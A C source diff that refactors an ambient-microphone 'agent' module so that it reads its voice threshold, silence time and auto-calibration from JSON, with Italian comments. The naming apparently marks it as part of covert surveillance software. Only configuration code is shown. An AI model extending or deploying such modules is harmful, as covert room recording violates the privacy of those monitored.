@@ -11,13 +11,6 @@ UINT amb_mic_voice_tsld = DEF_VOICE_TSLD;
 INT amb_mic_silence_time = DEF_SILENCE_TIME;
 BOOL  amb_mic_calibration = DEF_MIC_CALIBRATION;
 
-typedef struct {
-	BOOL calibration;
-	INT silence_time;
-	UINT voice_tsld;
-} ambmic_conf_struct;
-
-
 DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	char codec_path[DLLNAMELEN];
@@ -48,23 +41,12 @@ DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_AmbMicInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_AmbMicInit(JSONObject elem)
 {
-	ambmic_conf_struct *ambmic_conf;
+	amb_mic_voice_tsld = (DWORD) (elem[L"threshold"]->AsNumber() * 1000);
+	amb_mic_silence_time = (DWORD) elem[L"silence"]->AsNumber();
+	amb_mic_calibration = (BOOL) elem[L"autosense"]->AsBool();
 
-	// Legge configurazioni dal file
-	if (conf_ptr) {
-		ambmic_conf = (ambmic_conf_struct *)conf_ptr;
-		amb_mic_voice_tsld = ambmic_conf->voice_tsld;
-		amb_mic_silence_time = ambmic_conf->silence_time;
-		amb_mic_calibration = ambmic_conf->calibration;
-	} else {
-		amb_mic_voice_tsld = DEF_VOICE_TSLD;
-		amb_mic_silence_time = DEF_SILENCE_TIME;
-		amb_mic_calibration = DEF_MIC_CALIBRATION;
-	}
-
-	PM_AmbMicStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
@@ -93,10 +75,5 @@ DWORD __stdcall PM_AmbMicUnregister()
 
 void PM_AmbMicRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_AMBMICAGENT, NULL, (BYTE *)PM_AmbMicStartStop, (BYTE *)PM_AmbMicInit, (BYTE *)PM_AmbMicUnregister);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_AmbMicInit(NULL, FALSE);
+	AM_MonitorRegister(L"mic", PM_AMBMICAGENT, NULL, (BYTE *)PM_AmbMicStartStop, (BYTE *)PM_AmbMicInit, (BYTE *)PM_AmbMicUnregister);
 }
